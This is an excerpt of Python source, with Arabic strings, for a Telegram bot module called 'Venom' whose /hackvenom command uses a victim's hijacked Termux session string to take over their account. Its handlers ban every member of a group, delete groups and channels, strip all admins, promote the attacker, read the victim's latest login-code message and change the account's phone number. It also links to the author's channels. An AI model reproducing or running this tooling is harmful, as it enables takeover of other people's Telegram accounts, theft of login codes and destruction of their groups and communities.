...
"A" :~ [معرفه قنوات/جروبات التي يملكها]

"B" :~ [جلب جميع معلومات المستخدم مثل {رقم الحساب ، معرف المستخدم و ايدي الشخص... ]

"C" :~ [{تفليش جروب/قناه {اعطني الكود و بعدها ارسل لي يوزر الجروب/القناه و ساطرد جميع اعضاء]

"D" :~ [جلب اخر رساله تحتوي على كود تسجيل دخول الى الحساب عن طريق كود ترمكس]

"E" :~ [انضمام الى جروب/قناه عن طريق كود ترمكس] 

"F" :~ [مغادره جروب /قناه عن طريق كود ترمكس]

"G" :~][مسح جروب /قناه عن عن طريق كود ترمكس]
...
"K" :~ [حذف جميع المشرفين في جروب/قناه]

"L" ~ [ترقيه عضو الى مشرف داخل جروب/قناه]

"M" ~ [تغير رقم الحساب باستخدام كود ترمكس]

'''
mm = '''
قم بلأنضمام الى قناة فينوم @rb_ro
'''
...
keyboard = [
  ...
  [
    Button.url("سورس فينوم ✪", "https://t.me/rb_ro")
    ]
]
...
async def op(event):
    ...
    await event.edit(f"**᯽︙ قم بالدخول لبوتك من هنا @{joker} \n وكتابة الامر /hackvenom** ")
 
@tgbot.on(events.NewMessage(pattern="/hackvenom", func = lambda x: x.is_private))
  ...
  if event.sender_id == bot.uid:
      async with bot.conversation(event.chat_id) as x:
        keyboard = [
          ...
          [
            Button.url("المطور", "https://t.me/R_R_B0")
            ]
        ]
...
async def users(event):
  async with bot.conversation(event.chat_id) as x:
    ...
    await x.send_message("أرسل لي معرف/ايدي الجروب او القناة")
    grpid = await x.get_response()
    await userbans(strses.text, grpid.text)
    await event.reply("يتم حظر جميع اعضاء القناة/الجروب", buttons=keyboard)
...
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      ...
      await event.reply(i + "\n\nشكرا لأستخدامك سورس فينوم", buttons=keyboard)
...
async def users(event):
  async with bot.conversation(event.chat_id) as x:
    ...
    if op:
      ...
      return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
    await x.send_message("اعطني معرف/ايدي القناة او الجروب")
    grpid = await x.get_response()
    await joingroup(strses.text, grpid.text)
    await event.reply("تم الانضمام الى القناة او الجروب", buttons=keyboard)
...
async def users(event):
  async with bot.conversation(event.chat_id) as x:
    ...
    if op:
      ...
      return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
    await x.send_message("اعطيني معرف /ايدي الجروب او القناة")
    grpid = await x.get_response()
    await leavegroup(strses.text, grpid.text)
    await event.reply("لقد تم مغادرة القناة او الجروب,", buttons=keyboard)
...
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      ...
      if op:
        ...
        return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
      await x.send_message("اعطيني معرف/ايدي القناة او الجروب")
      grpid = await x.get_response()
      await delgroup(strses.text, grpid.text)
      await event.reply("لقد تم حذف القناة/الجروب شكرا لأستخدامك فينوم.", buttons=keyboard)
...
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      ...
      await event.reply("لقد تم انهاء جميع الجلسات شكراً لأستخدامك فينوم.", buttons=keyboard)
...
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      ...
      if op:
        ...
        return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
      await x.send_message("ارسل لي معرف/ايدي القناة او الجروب")
      grp = await x.get_response()
      await x.send_message("الان ارسل لي المعرف")
      user = await x.get_response()
      i = await promote(strses.text, grp.text, user.text)
      await event.reply("سأرفعك في القناة/الجروب 😉.", buttons=keyboard)
...
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      ...
      try:
        ...
        pass
      await event.reply("تم حذف جميع مشرفين الجروب/القناة.", buttons=keyboard)
...
async def start(event):
    keyboard = [
      ...
      [
        Button.url("القناة", "https://t.me/RB_RO")
        ]
    ]
